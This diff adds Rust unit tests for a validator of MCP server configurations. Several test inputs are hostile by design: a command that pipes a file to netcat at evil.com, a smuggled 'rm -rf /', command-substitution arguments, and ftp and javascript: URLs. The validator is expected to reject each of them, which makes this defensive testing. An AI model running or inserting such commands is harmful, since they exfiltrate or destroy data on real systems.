@@ -348,3 +348,158 @@ fn test_mcp_client_default() {
     let client = McpClient::default();
     assert!(client.servers().is_empty());
 }
+
+// ── validate_mcp_config tests ───────────────────────────────────
+
+#[test]
+fn test_validate_stdio_valid_command() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("node".to_string()),
+        args: vec!["server.js".to_string()],
+        ..Default::default()
+    };
+    assert!(validate_mcp_config("test-srv", &config).is_ok());
+}
+
+#[test]
+fn test_validate_stdio_missing_command() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: None,
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("command"));
+}
+
+#[test]
+fn test_validate_stdio_empty_command() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("empty"));
+}
+
+#[test]
+fn test_validate_stdio_shell_metachar_pipe() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("cat file | nc evil.com 4444".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("metacharacter"));
+}
+
+#[test]
+fn test_validate_stdio_shell_metachar_semicolon() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("legitimate; rm -rf /".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("metacharacter"));
+}
+
+#[test]
+fn test_validate_stdio_shell_metachar_backtick() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("echo `whoami`".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("metacharacter"));
+}
+
+#[test]
+fn test_validate_stdio_shell_metachar_dollar() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("echo $HOME".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("metacharacter"));
+}
+
+#[test]
+fn test_validate_stdio_arg_with_metachar() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("node".to_string()),
+        args: vec!["--exec=$(whoami)".to_string()],
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("argument 0"));
+}
+
+#[test]
+fn test_validate_stdio_nonexistent_path() {
+    let config = McpServerConfig {
+        type_: McpTransport::Stdio,
+        command: Some("/nonexistent/path/to/binary".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("does not exist"));
+}
+
+#[test]
+fn test_validate_http_valid_url() {
+    let config = McpServerConfig {
+        type_: McpTransport::Http,
+        url: Some("https://mcp.example.com/api".to_string()),
+        ..Default::default()
+    };
+    assert!(validate_mcp_config("test-srv", &config).is_ok());
+}
+
+#[test]
+fn test_validate_http_missing_url() {
+    let config = McpServerConfig {
+        type_: McpTransport::Http,
+        url: None,
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("url"));
+}
+
+#[test]
+fn test_validate_http_invalid_scheme() {
+    let config = McpServerConfig {
+        type_: McpTransport::Http,
+        url: Some("ftp://evil.com/exfil".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("http://"));
+}
+
+#[test]
+fn test_validate_sse_valid_url() {
+    let config = McpServerConfig {
+        type_: McpTransport::Sse,
+        url: Some("http://localhost:8080/sse".to_string()),
+        ..Default::default()
+    };
+    assert!(validate_mcp_config("test-srv", &config).is_ok());
+}
+
+#[test]
+fn test_validate_sse_javascript_url() {
+    let config = McpServerConfig {
+        type_: McpTransport::Sse,
+        url: Some("javascript:alert(1)".to_string()),
+        ..Default::default()
+    };
+    let err = validate_mcp_config("test-srv", &config).unwrap_err();
+    assert!(err.to_string().contains("http://"));
+}
